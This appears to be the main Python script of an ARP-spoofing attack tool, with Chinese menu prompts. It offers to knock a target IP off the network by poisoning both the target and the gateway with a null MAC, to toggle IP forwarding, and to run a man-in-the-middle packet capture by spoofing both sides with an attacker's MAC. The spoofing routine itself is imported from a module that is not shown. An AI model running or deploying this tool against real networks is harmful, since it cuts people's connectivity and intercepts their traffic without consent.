import platform
import threading
from UIout import UIout
from Attack import Attack
from Route import detect_and_enable_routing, detect_and_disable_routing


def DisconnectTarget():
    target_ip = input("请输入目标IP:")
    target_mac = input("请输入目标MAC:")
    gateway_ip = input("请输入网关IP:")
    gateway_mac = input("请输入网关MAC:")
    fake_mac = "00-00-00-00-00-00"
    timebreak = 0
    thread = threading.Thread(target=Attack, args=(target_ip, target_mac, gateway_ip, gateway_mac, fake_mac, timebreak), daemon=True)
    thread1 = threading.Thread(target=Attack, args=(gateway_ip, gateway_mac, target_ip, target_mac, fake_mac, timebreak), daemon=True)
    thread2 = threading.Thread(target=Attack, args=(target_ip, target_mac, gateway_ip, gateway_mac, fake_mac, timebreak), daemon=True)
    thread.start()
    thread1.start()
    thread2.start()

def OpenRoute():
    input("开启/关闭路由请以管理员的身份运行脚本，否则会闪退，你明白了吗？\ny/n")
    detect_and_enable_routing()

def CloseRoute():
    input("开启/关闭路由请以管理员的身份运行脚本，否则会闪退，你明白了吗？\ny/n")
    detect_and_disable_routing()

def CapturePacket():
    input("捕获数据开启前请开启路由转发！\ny/n")   
    target_ip = input("请输入目标IP:")
    target_mac = input("请输入目标MAC:")
    gateway_ip = input("请输入网关IP:")
    gateway_mac = input("请输入网关MAC:")
    fake_mac = input("请输入中间人MAC:")
    timebreak = 1
    thread = threading.Thread(target=Attack, args=(target_ip, target_mac, gateway_ip, gateway_mac, fake_mac, timebreak))
    thread1 = threading.Thread(target=Attack, args=(gateway_ip, gateway_mac, target_ip, target_mac, fake_mac, timebreak))
    thread.start()
    thread1.start()


if __name__ == "__main__":
    UIout()
    while True:
        ret = input("请输入指令:")
        if ret == "1":
            DisconnectTarget()
        elif ret == "2":
            OpenRoute()
        elif ret == "3":
            CloseRoute()
        elif ret == "4":
            CapturePacket()
        elif ret == "5":
            UIout()
    
